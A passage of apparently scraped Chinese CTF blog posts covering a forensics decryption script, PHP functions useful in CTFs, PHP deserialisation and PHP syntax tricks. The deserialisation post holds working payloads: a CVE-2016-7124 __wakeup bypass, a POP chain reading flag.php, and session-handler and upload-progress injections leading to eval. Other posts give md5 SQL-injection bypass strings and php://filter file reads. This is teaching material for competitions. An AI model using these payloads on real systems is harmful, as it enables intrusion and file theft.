0.52, &#x27;2022-04-28&#x27;)(&#x27;29&#x27;, 0.53, &#x27;2022-04-29&#x27;)(&#x27;30&#x27;, 0.50, &#x27;2022-04-30&#x27;) 然后提取出题目要求的转账记录，根据前一题的加密脚本解密，然后按照汇率转成 RMB，求和即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpfunction decrypt($data, $key = &#x27;jyzg123456&#x27;) &#123; $key = md5($key); $x = 0; $data = base64_decode($data); $len = strlen($data); $l = strlen($key); $char = &#x27;&#x27;; $str = &#x27;&#x27;; for ($i = 0; $i &lt; $len; $i++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= $key[$x]; $x++; &#125; for ($i = 0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) - ord($char[$i]) + 256) % 256); &#125; return $str;&#125;$file = fopen(&quot;exchange_rate.txt&quot;, &quot;r&quot;);$rate = array();while(!feof($file)) &#123; $str = fgets($file); list($id, $x, $time) = sscanf($str, &quot;(%s %f, %s)&quot;); $rate[] = $x;&#125;fclose($file);// 3 -&gt; 5$file = fopen(&quot;data.txt&quot;, &quot;r&quot;);$res = 0;while(!feof($file)) &#123; $str = fgets($file); list($id_1, $id_2, $date, $time, $to, $from, $enc) = sscanf($str, &quot;(%d, %s %s %s %d, %d, %s)&quot;); if ($from != 3 || $to != 5) &#123; continue; &#125; $enc = substr($enc, 1, strlen($enc) - 3); $date = substr($date, strlen($date) - 2, 2) - 1; if ($date &lt; 1 || $date &gt; 17) &#123; continue; &#125; $res = $res + $rate[$date] * decrypt($enc);&#125;echo $res;fclose($file); 最后答案是 15758353.76","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"蓝帽杯","slug":"CTF/蓝帽杯","permalink":"https://sxyugao.top/categories/CTF/%E8%93%9D%E5%B8%BD%E6%9D%AF/"}],"tags":[{"name":"蓝帽杯","slug":"蓝帽杯","permalink":"https://sxyugao.top/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/"}]},{"title":"在CTF中常用到的PHP函数","slug":"在CTF中常用到的PHP函数","date":"2022-03-04T11:56:37.000Z","updated":"2023-04-09T09:09:54.648Z","comments":true,"path":"p/a1789b58.html","permalink":"https://sxyugao.top/p/a1789b58.html","excerpt":"本文列举了一些在 CTF 比赛中常用到的 PHP 函数。","text":"本文列举了一些在 CTF 比赛中常用到的 PHP 函数。 参数与字符串相关的函数 在 PHP8.x 中，这些函数不再接受数组的参数，会抛出 Fatal error 并结束运行，以下不再赘述。 在之前版本中能接受数组型参数这一特性常被网上称之为内置函数的松散性，虽然我也不懂为啥这样叫。。 md5 以 32 字符十六进制数字形式返回散列值。 1md5($str[, bool $raw_output = FALSE]) raw_output 如果可选的 raw_output 被设置为 TRUE, 那么将以 16 字节长度的原始二进制格式返回 如果参数为数组将会返回 NULL 并发出 Warning。 也可以借助返回以 0e 开头的数字字符串来实现绕过弱类型比较。 一些常见的例子： 字符串 md5值 byGcY 0e591948146966052067035298880982 sonZ7y 0e463306343746311593316642162425 QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s1665632922a 0e731198061491163073197128363787 s1836677006a 0e481036490867661113260034900752 当然真正意义上的 md5 碰撞也是存在的，不过 CTF 应该不会涉及这么深吧。。 贴个链接：https://natmchugh.blogspot.com/2014/10/how-i-created-two-images-with-same-md5.html 有意思的是，如果第二个参数是 true，可以弄出神奇的效果。 假如有这样的 SQL 语句： 1$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password, true).&quot;&#x27;&quot; 然后有这样的字符串： 1234echo md5(&quot;129581926211651571912466741651878684928&quot;, true);// \u0006T0Do#&#x27;or&#x27;8echo md5(&quot;ffifdyop&quot;, true);// &#x27;or&#x27;6]!r,b\u001c 就能绕过 md5 的加密了。 sha1 和 md5 函数利用差不多，真正意义上的 sha1 碰撞也是存在的，不过 CTF 应该不会涉及这么深吧。。 贴个链接：https://shattered.it/ hash 123456hash( string $algo, string $data, bool $binary = false, array $options = []): string 其实是一个哈希函数的集中调用，具体有哪些算法可见 hash_algos() 返回的数组，而常用的 md5、sha1 等也包括在里面，只是因为更常用被单独列出来了。 在 PHP8.x 之后传入不存在的哈希算法会直接抛出错误，之前则是返回一个 false,而且这个信息在官方中文文档没有提及，只有英文原版才有 Changelog 一些和 md5 一样神奇的骚操作： 123echo hash(&quot;whirlpool&quot;, &#x27;364383&#x27;, true);// TNF /$=/!%.i&lt;0&#x27;=&#x27;IT Q// r=%͞nNŶ\u0002vL strcmp 1strcmp($str1, $str2); // 比较两个字符串是否相等 返回值： 如果 str1 小于 str2 返回 &lt; 0 如果 str1 大于 str2 返回 &gt; 0 如果两者相等，返回 0 如果某个参数为数组将返回 NULL 并发出 Warning。 存在弱类型比较的函数 in_array 1in_array(mixed $needle, array $haystack, bool $strict = false): bool 参数名非常的生动形象，大海捞针(●’◡’●)。 注意到第三个参数 strict，默认是 false，即采用弱类型比较（==）来查找，可以参考我的另一篇文章，里面有对 PHP 弱类型比较的详解。。 举个例子： 123&lt;?phpvar_dump(in_array(&#x27;1e05&#x27;, [100000, 2, 3, 4, 5])); // bool(true)var_dump(in_array(&#x27;1e05&#x27;, [100000, 2, 3, 4, 5], true)); // bool(false) array_search 1array_search(mixed $needle, array $haystack, bool $strict = false): int|string|false 和 in_array 类似。 举个例子： 123&lt;?phpvar_dump(array_search(&#x27;5e05&#x27;, [1, 2, 3, 4, 500000])); // int(4)var_dump(array_search(&#x27;5e05&#x27;, [1, 2, 3, 4, 500000], true)); // bool(false)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://sxyugao.top/categories/CTF/Web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://sxyugao.top/tags/PHP/"}]},{"title":"PHP中的序列化与反序列化","slug":"PHP中的序列化与反序列化","date":"2022-02-28T02:52:41.000Z","updated":"2023-04-09T09:06:13.278Z","comments":true,"path":"p/93447acb.html","permalink":"https://sxyugao.top/p/93447acb.html","excerpt":"序列化和反序列化是非常重要的概念，不仅仅存在于 CTF，也广泛的存在于平时操作中，本文就介绍一下序列化、反序列化的基础知识以及常见的可能出现的漏洞。","text":"序列化和反序列化是非常重要的概念，不仅仅存在于 CTF，也广泛的存在于平时操作中，本文就介绍一下序列化、反序列化的基础知识以及常见的可能出现的漏洞。 定义 序列化：把对象转化为可传输的字节序列过程称为序列化。 反序列化：把字节序列还原为对象的过程称为反序列化。 事实上可以反序列的类型并不只有对象，但是对象是最常见的。 一般来说匿名函数是无法被序列化和反序列化的，但通过一些拓展库比如 Opis Closure 也能做到这两点。 为了能够 unserialize() 一个对象，这个对象的类必须已经定义过。如果序列化类 A 的一个对象，将会返回一个跟类 A 相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中反序列化一个对象，这个对象的类必须在反序列化之前定义，可以通过包含一个定义该类的文件或使用函数 spl_autoload_register() 来实现。 用处 正如定义所强调的可传输，有了序列化和反序列化，对象可以跨平台存储，和进行网络传输。又或者说将运行时的数据保存到本地，下次运行再唤醒。甚至因为规定了序列化的方式，我们可以类似 JSON 一样跨语言使用对象。 结构 此处参考了网上的文章，笔者根据新版本做了一些修订，写了一些例子。但初始出处已经不可考证，故不放链接。 PHP 对不同类型的数据用不同的字母进行标示： 字母标识 数据类型 a array b boolean d double i integer o common object r reference s string S escaped binary string C custom object O class N null R pointer reference U unicode string 接下来介绍一些常见的类型序列化后字符串的结构： 字符串 字符串型数据（string）被序列化为： s:&lt;length&gt;:&quot;&lt;value&gt;&quot;; 其中 &lt;length&gt; 是源字符串的字节数，而非 &lt;value&gt; 看上去的长度。 举个例子： 1234&lt;?php$s = &quot;一个测试&quot;;echo serialize($s);// s:12:&quot;一个测试&quot;; 输出结果为 ``。 数组 数组（array）通常被序列化为： a:&lt;n&gt;:&#123;&lt;key 1&gt;&lt;value 1&gt;&lt;key 2&gt;&lt;value 2&gt;...&lt;key n&gt;&lt;value n&gt;&#125; 举个例子： 1234&lt;?php$arr = array(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;);echo serialize($arr);// a:4:&#123;i:0;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;s:1:&quot;c&quot;;i:3;s:1:&quot;d&quot;;&#125; 对象 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法。 对象类型（object）通常被序列化为： O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125; 其中 &lt;length&gt; 表示对象的类名的字符串长度。&lt;n&gt; 表示对象中的字段个数。这些字段包括在对象所在类及其祖先类中用 public、protected 和 private 声明的字段，但是不包括 static 和 const 声明的静态字段。也就是说只有实例（instance）字段。&lt;filed name 1&gt;、&lt;filed name 2&gt;……&lt;filed name n&gt; 表示每个字段的字段名，而 &lt;filed value 1&gt;、&lt;filed value 2&gt;……&lt;filed value n&gt; 则表示与字段名所对应的字段值。 字段名和字段值会被分别序列化。 字段名是字符串型，序列化后格式与字符串型数据序列化后的格式相同。 字段值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。 但字段名的序列化与它们声明的可见性是有关的，下面重点讨论一下关于字段名的序列化。 var 和 public 声明的字段都是公共字段，甚至可以说它们等价，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。 protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前会加上 \\0*\\0，这里的 \\0 表示 ASCII 码为 0 的字符 NUL。 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。**因此私有字段的字段名在序列化时，字段名前会加上 \\0&lt;declared class name&gt;\\0。**这里 &lt;declared class name&gt; 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因此声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。 字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。字符串长度也包括所加前缀的长度。其中 \\0 字符也是计算长度的。 为了更好的体现字段名中包括根据其可见性所加的前缀，我使用了 urlencode，举个例子： 123456789101112131415161718&lt;?phpclass Flag &#123; public $flag = &quot;this is a private object&quot;;&#125;class Test &#123; const _const = &quot;this is aconst&quot;; public $var = &quot;this is a var&quot;; public $public = &quot;this is a public&quot;; protected $protected = &quot;this is a protected&quot;; private $private; static $static = &quot;this is a static&quot;; public function __construct() &#123; $this-&gt;private = new Flag(); &#125;&#125;$test = new Test();echo urlencode(serialize($test));// O%3A4%3A%22Test%22%3A4%3A%7Bs%3A3%3A%22var%22%3Bs%3A3%3A%22var%22%3Bs%3A6%3A%22public%22%3Bs%3A6%3A%22public%22%3Bs%3A12%3A%22%00%2A%00protected%22%3Bs%3A9%3A%22protected%22%3Bs%3A13%3A%22%00Test%00private%22%3BO%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22flag%22%3Bs%3A24%3A%22this+is+a+private+object%22%3B%7D%7D 把可见字符给 decode 一下，就变成了 O:4:&quot;Test&quot;:4:&#123;s:3:&quot;var&quot;;s:3:&quot;var&quot;;s:6:&quot;public&quot;;s:6:&quot;public&quot;;s:12:&quot;%00*%00protected&quot;;s:9:&quot;protected&quot;;s:13:&quot;%00Test%00private&quot;;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;flag&quot;;s:24:&quot;this is a private object&quot;;&#125;&#125;，留意 protected 和 private 的字段名前缀。 魔术方法 这一块其实是 PHP 类的内容。 魔术方法是一种特殊的方法，当对象执行某些操作时会覆盖 PHP 的默认操作，下面列举一些 CTF 中常用的魔术方法，参考 PHP 官方文档。 __wakeup() 函数原型：public __wakeup(): void __wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 __unserialize() 函数原型：public __unserialize(array $data): void unserialize() 检查是否存在具有名为 __unserialize() 的魔术方法。此函数将会传递从 __serialize() 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略，此特性自 PHP 7.4.0 起可用。 __toString() 函数原型：public __toString(): string __toString() 方法用于一个类被当成字符串时应怎样回应。 一些常见的触发情景： 1、echo($obj) / print(\\$obj) 打印时会触发。 2、反序列化对象与字符串连接时。 3、反序列化对象参与格式化字符串时。 4、反序列化对象与字符串进行 == 弱类型比较时。 5、反序列化对象参与格式化SQL语句，绑定参数时。 6、反序列化对象在作为接收字符串参数函数如 strlen()、addslashes()、class_exists() 的参数时。 7、在 in_array() 方法中，第一个参数是反序列化对象，第二个参数的数组中有 __toString 返回的字符串的时候 __toString 会被调用。 … __invoke() 函数原型：__invoke( ...$values): mixed 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 举个例子： 123456789&lt;?phpclass Test &#123; function __invoke($x) &#123; echo &quot;\\$&#123;$x&#125; is called as a function&quot;; &#125;&#125;$test = new Test();$test(&quot;test&quot;);// $test is called as a function __destruct() 函数原型：__destruct(): void PHP 有析构函数的概念，这类似于其它面向对象的语言，如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 重载 直接照搬的 PHP 文档 属性重载 函数原型： 1234public __set(string $name, mixed $value): voidpublic __get(string $name): mixedpublic __isset(string $name): boolpublic __unset(string $name): void 在给不可访问（protected 或 private）或不存在的属性赋值时，__set() 会被调用。 读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用。 当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty() 时，__isset() 会被调用。 当对不可访问（protected 或 private）或不存在的属性调用 unset() 时，__unset() 会被调用。 参数 $name 是指要操作的变量名称。__set() 方法的 $value 参数指定了 $name 变量的值。 属性重载只能在对象中进行。在静态方法中，这些魔术方法将不会被调用。所以这些方法都不能被声明为 static。将这些魔术方法定义为 static 会产生一个警告。 方法重载 函数原型： 12public __call(string $name, array $arguments): mixedpublic static __callStatic(string $name, array $arguments): mixed 在对象中调用一个不可访问方法时，__call() 会被调用。 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。 $name 参数是要调用的方法名称。$arguments 参数是一个枚举数组，包含着要传递给方法 $name 的参数。 举个例子： 1234567891011121314&lt;?phpclass Test &#123; public function __call($name, $arguments) &#123; echo &quot;Calling object method &#x27;$name&#x27; on line &quot;.implode(&#x27;, &#x27;, $arguments). &quot;\\n&quot;; &#125; public static function __callStatic($name, $arguments) &#123; echo &quot;Calling static method &#x27;$name&#x27; on line &quot;.implode(&#x27;, &#x27;, $arguments). &quot;\\n&quot;; &#125;&#125;$test = new Test();$test-&gt;run( __LINE__);// Calling object method &#x27;run&#x27; on line 11Test::runStatic(__LINE__);// Calling static method &#x27;runStatic&#x27; on line 12 利用 CVE-2016-7124 绕过 __wakeup() 在 PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10 的版本都存在有关 __wakeup() 的漏洞，当反序列化中对象中的字段个数和后面字段内容不匹配时，__wakeup() 就会被绕过。 举个例子： 1234567891011&lt;?php class Test &#123; function __destruct() &#123; echo &#x27;Bypass&#x27;; &#125; function __wakeup() &#123; echo &#x27;Fail to &#x27;; &#125;&#125;$payload = $_GET[&#x27;payload&#x27;];unserialize($payload); 对于正常的序列化字符串 O:4:&quot;Test&quot;:0:&#123;&#125; 来说肯定输出的是 Fail to Bypass，但是在低版本的 PHP 中可以构造错误的序列化字符串来绕过。 payload：/index.php?payload=O:4:&quot;Test&quot;:1:&#123;&#125; 输出 Bypass。 弱类型比较绕过 本来想放到弱类型比较讲的，想想还是放到这里吧。 由于 PHP 是弱类型语言，所以类的成员可以多次赋值成不同的类型。 举个例子： 123456789&lt;?phpclass Test &#123; public $val;&#125;$test = new Test;$test-&gt;val = &quot;2333&quot;;var_dump($test-&gt;val); // string(4) &quot;2333&quot;$test-&gt;val = 666;var_dump($test-&gt;val); // int(666) 考虑有以下代码： 12345678class User &#123; public $name; public $password;&#125;$data = unserialize($_POST[&#x27;data&#x27;]);if ($data-&gt;user == &#x27;admin&#x27; &amp;&amp; $data-&gt;password == &#x27;secret&#x27;) &#123; echo &#x27;login success!&#x27;.PHP_EOL;&#125; 构造 payload： 12345678910&lt;?phpclass User &#123; public $name; public $password;&#125;$user = new User;$user-&gt;name = true;$user-&gt;password = true;echo serialize($user);// O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125; 发现我们成功登录了！ POP链构造 POP 是指面向属性编程（Property-Oriented Programing）, 用于上层语言构造特定调用链的方法。 我们去寻找会被自动调用的方法，比如 __destruct()、__toString() 等，然后找到里面可能可以利用的函数或者语法结构，再找到和这些函数相关的成员，只要这些成员可控，就能执行恶意代码或者拿到想要的文件了。 注意 PHP 是弱类型语言，所以类的成员可以多次赋值成不同的类型，因而不必拘泥于原来 __construct() 中给变量赋值的类型，可以去找可利用的恶意类。 举个例子： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass MyFile &#123; public $name; public $user; public function __construct($name, $user) &#123; $this-&gt;name = (string)$name; $this-&gt;user = (string)$user; &#125; public function __toString() &#123; return file_get_contents($this-&gt;name); &#125; public function __wakeup()&#123; if (stristr($this-&gt;name, &quot;flag&quot;) !== false) &#123; $this-&gt;name = &quot;/etc/hostname&quot;; &#125; else &#123; $this-&gt;name = &quot;/etc/passwd&quot;; &#125; if (isset($_GET[&#x27;user&#x27;])) &#123; $this-&gt;user = $_GET[&#x27;user&#x27;]; &#125; &#125; public function __destruct() &#123; echo $this; &#125;&#125;if (isset($_GET[&#x27;input&#x27;])) &#123; $input = $_GET[&#x27;input&#x27;]; if (stristr($input, &#x27;user&#x27;) !== false) &#123; die(&#x27;Hacker&#x27;); &#125; else &#123; unserialize($input); &#125;&#125; else &#123; highlight_file(__FILE__);&#125; 我们可以发现这么一个链子 __wakeup() -&gt; __destruct() -&gt; __toString()，在 __toString() 中存在可利用的函数 file_get_contents。 但是 __wakeup() 中的 name 字段被重新赋值了，而高版本 PHP 中并不能绕过 __wakeup()，怎么办？ 发现 user 是我们能控制的，那么可以借助引用将 name 绑定到 user 上去，而且 user 的赋值正好在 name 赋值之后！ 但是在最开始的 input 过滤了 user，我们可以利用结构里提到的 S 类型绕过。 123456789101112&lt;?phpclass MyFile &#123; public $name; public $user;&#125;$x = new MyFile();$x-&gt;user = &quot;&quot;;$x-&gt;name = &amp;$x-&gt;user;$payload = serialize($x);$payload = str_replace(&quot;user&quot;, &quot;use\\\\72&quot;, $payload);$payload = str_replace(&quot;s:&quot;, &quot;S:&quot;, $payload);echo $payload; 得到 payload：?input=O:6:&quot;MyFile&quot;:2:&#123;S:4:&quot;name&quot;;S:0:&quot;&quot;;S:4:&quot;use\\72&quot;;R:2;&#125;&amp;user=flag.php SESSION反序列化 SESSION机制 假如有以下代码： 1234567891011&lt;?phpsession_start();if (empty($_SESSION[&#x27;count&#x27;])) &#123; $_SESSION[&#x27;count&#x27;] = 1;&#125; else &#123; $_SESSION[&#x27;count&#x27;]++;&#125;?&gt;&lt;p&gt;Hello visitor, you have seen this page &lt;?php echo $_SESSION[&#x27;count&#x27;]; ?&gt; times.&lt;/p&gt; 如果你第一次访问这个页面，它会在服务器生成一个名为 sess_&lt;SID&gt; 的 session 文件，并将 SID 保存到 cookie 中，以供下次会话时使用。 这个过程中，会填充 $_SESSION 超级全局变量，并在程序结束时将其序列化储存在 session 文件中。 说是序列化其实和常规的 serialize 有一定的差异，在这里存在多种序列化方式，可在 session.serialize_handler 配置项进行更改，默认是 php。 引擎 存储方式 php &lt;key&gt;|&lt;serialized_value&gt; php_binary &lt;chr(key)&gt;&lt;key&gt;&lt;serialized_value&gt; php_serialize &lt;serialized_session&gt; 123456&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();$_SESSION[&#x27;handler&#x27;] = &#x27;php&#x27;;// handler|s:3:&quot;php&quot;; 123456&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;handler&#x27;] = &#x27;php_binary&#x27;;// \u0007handlers:10:&quot;php_binary&quot;; 123456&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;handler&#x27;] = &#x27;php_serialize&#x27;;// a:1:&#123;s:7:&quot;handler&quot;;s:13:&quot;php_serialize&quot;;&#125; 引擎不同导致的漏洞 一般来说 session 是用户有限更改的或是在后端控制之下的。但是如果在同一个 web 应用中用了两个引擎就可能出现这个漏洞。有一说一，这种漏洞也挺离谱的，不像是正常环境能出来的，只要不在代码里自定义引擎就不会有这种 bug 产生。 产生的原因是 php 和 php_serialize 引擎在处理 | 的时候是不同的行为。 如果生成 session 是用 php_serialize，读取 session 是用 php，| 在 php_serialize 眼中只是一个普通字符，但在 php 眼中却是键名和键值的分隔符。 举个例子： 1234567891011// login.php&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();if (isset($_GET[&#x27;user&#x27;])) &#123; $_SESSION[&#x27;user&#x27;] = $_GET[&#x27;user&#x27;]; echo &quot;login success!&quot;;&#125; else &#123; echo &quot;login first!&quot;;&#125; 123456789101112// index.php&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class User &#123; public $name; function __wakeup()&#123; echo &quot;hello &quot;.$this-&gt;name.&quot;!&lt;br&gt;&quot;; &#125;&#125;echo &quot;is there something wrong?&quot;; 构造 payload： 1234567&lt;?phpclass User &#123; public $name;&#125;$user = new User();$user-&gt;name = &quot;233&quot;;echo &quot;|&quot;.serialize($user); 先访问 login.php?user=/login.php?user=|O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;233&quot;;&#125; 然后访问 index.php 就能发现 __wakeup() 魔术方法被调用了。 SESSION上传进度 在 session.upload_progress.enabled = On 的情况下，session 文件会记录文件上传的进度，这就意味着 session 文件内容可控，则可能产生反序列化漏洞。 举个例子： 123456789101112131415161718&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class Shell &#123; public $shell; function __construct() &#123; $this-&gt;shell = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;shell); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;])) &#123; $m = new Shell();&#125; else &#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125; 然后得到 session.upload_progress.enabled=On 以及 session.upload_process.name。 构造 payload，传递表单： 1234567891011&lt;?phpclass Shell &#123; public $shell = &#x27;print_r(scandir(dirname(__FILE__)));&#x27;;&#125;$x = new Shell();?&gt;&lt;form action=&quot;http://localhost/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&lt;?= &quot;|&quot;.serialize($x); ?&gt; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 就能任意执行 PHP 代码了。 但是一般来说在 session.upload_progress.cleanup = On 的情况下（默认情况下），新建的上传进度马上就会被销毁，导致反序列化失败，我们需要利用条件竞争，让服务器在没反应过来删除的时候成功反序列化。 可以利用 BurpSuite 的 intruder 模块多线程发包。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://sxyugao.top/categories/CTF/Web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://sxyugao.top/tags/PHP/"}]},{"title":"PHP中的一些语法特性","slug":"PHP中的一些语法特性","date":"2022-02-21T02:15:14.000Z","updated":"2023-04-09T09:09:05.111Z","comments":true,"path":"p/e31149de.html","permalink":"https://sxyugao.top/p/e31149de.html","excerpt":"整理了一些 PHP 中的一些常在 CTF 比赛中用到的语法特性，也算是自用笔记。","text":"整理了一些 PHP 中的一些常在 CTF 比赛中用到的语法特性，也算是自用笔记。 短标签 常见的 PHP 代码都被类似 &lt;?php ...... ?&gt;，但也支持缩写形式 &lt;?= ...... ?&gt;，在 short_open_tag 开启的时候也可以使用 &lt;? ...... ?&gt;。 其中 &lt;?= 是更完整的 &lt;?php echo 的简写形式。 而且单文件时右边可以不闭合，形如 &lt;?php ......，其他两个同理。 应用场景：文件上传或者文件包含时绕过 WAF 或者过滤。 因为考虑到和 XML 格式的兼容，默认情况下 short_open_tag 是被关闭的。 伪协议 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 等文件系统函数。除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。 具体启用了哪些可以在 php_info 中的 Registered PHP Streams 查看。 应用场景：常和 include file_get_contents 等函数配合使用，实现文件包含。 file:// 用来访问本地文件，当指定了一个相对路径（不以 /、\\、\\\\ 或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。 应用场景：读取 flag 或者是某些敏感文件。 http:// 常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 应用场景：通常用于远程包含。 php:// 用来访问各个输入/输出流。 php://input php://input 是个可以访问请求的原始数据的只读流。enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。 会读取 POST DATA 的内容。 php://filter php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 php://filter 参数 描述 resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 &lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 完整的可用的过滤器列表，下面只列举一些常用的过滤器。 字符串过滤器 作用 string.rot13 等同于str_rot13()，rot13变换 string.toupper 等同于strtoupper()，转大写字母 string.tolower 等同于strtolower()，转小写字母 转换过滤器 作用 convert.base64-encode 等同于 base64_encode()，base64编码 convert.base64-decode 等同于 base64_decode()，base64解码 例子：php://filter/read=convert.base64-encode/resource=$&#123;file&#125; php://input 受限于 allow_url_include zlib:// gz 格式文件的解压伪协议，似乎是 PHP 自带实现的？ 例子： compress.zlib://$&#123;file.gz&#125; zip:// zip 格式文件的解压伪协议，由 ZIP 扩展注册。 例子：zip://$&#123;archive.zip&#125;#$&#123;dir/file&#125;，在实际应用中 # 常用 URL 编码 %23 来代替。 如果不存在 ZIP 扩展，则不存在该伪协议。 data:// data:// — 数据（RFC 2397） 根据 RFC 文档的规定，一个 data 流格式应如下： 1234dataurl := &quot;data:&quot; [ mediatype ] [ &quot;;base64&quot; ] &quot;,&quot; datamediatype := [ type &quot;/&quot; subtype ] *( &quot;;&quot; parameter )data := *urlcharparameter := attribute &quot;=&quot; value 例子：data://text/plain;base64,ZGF0YQ== glob:// glob:// — 查找匹配的文件路径模式。 glob 模式使用通配符来广泛的匹配文件名，更加详细的介绍可以看 Wiki。 例子：glob://f[k-m]*，用来匹配以字符串 fl 开头的文件。 phar:// phar:// 用于处理 Phar 数据流，支持多种压缩方式。 具体启用了哪些压缩方式可以通过 php_info 找到 Phar 模块，表格中有 $&#123;type&#125;-based phar archives，其中 type 即为压缩方式。 例子：phar://$&#123;archive.zip&#125;/$&#123;file&#125;。 关于 Phar 还有更多，我会在新的文章里讲到它。 PHAR (PHp ARchive) 是 PHP 里类似于 JAR (Java ARchive) 的一种打包文件，通常后缀名为 .phar。如果你使用的是 PHP 5.3 或更高版本，那么 Phar 后缀文件是默认开启支持的，你不需要任何其他的安装就可以使用它。 序列化与反序列化 详见这篇文章 include 及类似函数 1、include() 当使用该函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。 2、require() 只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。 include_once()、require_once() 功能和 include()、require() 相同，但它们把要加载的文件存放在一个哈希表中，再次加载时检查这个哈希表，如果发现已经加载过则直接跳过。 被包含的文件将继承引入前具有的全部变量范围，比如调用文件前面定义了一些变量，那么这些变量就能够在被包含的文件中使用，反之，被包含文件中定义的变量也将从调用处开始可以被被调用文件所使用。 被包含文件中定义的函数、类在执行之后将可以被随处使用，即具有全局作用域。 有趣的是，如果被引入的文件与源文件变量重名，将会覆盖原有的文件中的变量。 举个例子，现在有两个文件 a.php 和 b.php。 12345678910// a.php&lt;?phpclass Fl4g &#123; function __toString() &#123; return &quot;NoNoNo&quot;; &#125;&#125;$x = new Fl4g();include(&quot;b.php&quot;);echo $x; 12345678// b.php&lt;?phpclass Flag &#123; function __toString() &#123; return &quot;YesYesYes&quot;; &#125;&#125;$x = new Flag(); 运行 a.php 会输出 